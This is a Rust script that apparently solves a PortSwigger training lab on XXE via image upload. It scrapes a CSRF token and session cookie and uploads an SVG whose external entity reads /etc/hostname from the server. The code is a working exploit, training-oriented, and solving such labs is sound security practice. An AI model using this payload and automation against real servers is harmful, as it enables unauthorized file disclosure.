/*************************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 17/10/2023
*
* Lab: Exploiting XXE via image file upload
*
* Steps: 1. Fetch a post page
*        2. Extract csrf token and session cookie
*        3. Post a comment with the malicious SVG image
*        4. Check the uploaded image for the content of /etc/hostname
*        5. Submit the solution
*
**************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{
        multipart::{Form, Part},
        Client, ClientBuilder, Response,
    },
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a640028038e2602850e6c0500ce0077.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    print!("{}", "â¦—1â¦˜ Fetching a post page.. ".white());
    io::stdout().flush();

    // fetch a post page
    let post_page = client
        .get(format!("{url}/post?postId=1"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the post page".red()
        ));

    println!("{}", "OK".green());
    print!(
        "{}",
        "â¦—2â¦˜ Extracting csrf token and session cookie.. ".white(),
    );
    io::stdout().flush();

    // extract session cookie
    let session = extract_session_cookie(post_page.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    // extract csrf token
    let csrf = extract_csrf(post_page).expect(&format!("{}", "[!] Failed to extract the csrf".red()));

    // the svg image to be uploaded which will contain the content of /etc/hostname
    let svg_image = r###"<?xml version="1.0" standalone="yes"?>
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
                        <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
                        <text font-size="16" x="0" y="16">
                        &xxe;
                            </text>
                            </svg>"###;

    // the svg image name
    // you can change this to what you want
    let svg_image_name = "image.svg";

    // the avatar part of the request
    let avatar_part = Part::bytes(svg_image.as_bytes())
        .file_name(svg_image_name)
        .mime_str("image/svg+xml")
        .expect(&format!(
            "{}",
            "[!] Failed to construct the avatar part".red()
        ));

    // construct the multipart form
    let form = Form::new()
        .part("avatar", avatar_part)
        .text("csrf", csrf)
        .text("postId", "1")
        .text("name", "no one")
        .text("comment", "no comment")
        .text("email", "no_one@hacker.com");

    println!("{}", "OK".green());
    print!(
        "{}",
        "â¦—3â¦˜ Posting a comment with the malicious SVG image.. ".white(),
    );
    io::stdout().flush();

    // post a comment with the malicious SVG image
    client
        .post(format!("{url}/post/comment"))
        .header("Cookie", format!("session={session}"))
        .multipart(form)
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to post a comment with the malicious SVG image".red()
        ));

    println!("{}", "OK".green());
    println!(
        "{} {} {}",
        "ðŸ—¹ Check".white(),
        "/post/comment/avatars?filename=1.png".green(),
        "for the content of /etc/hostname then submit the solution".white()
    );
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}

/*************************************************
* Function to extract csrf from the response body
**************************************************/
fn extract_csrf(res: Response) -> Option<String> {
    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
    {
        Some(csrf.to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}
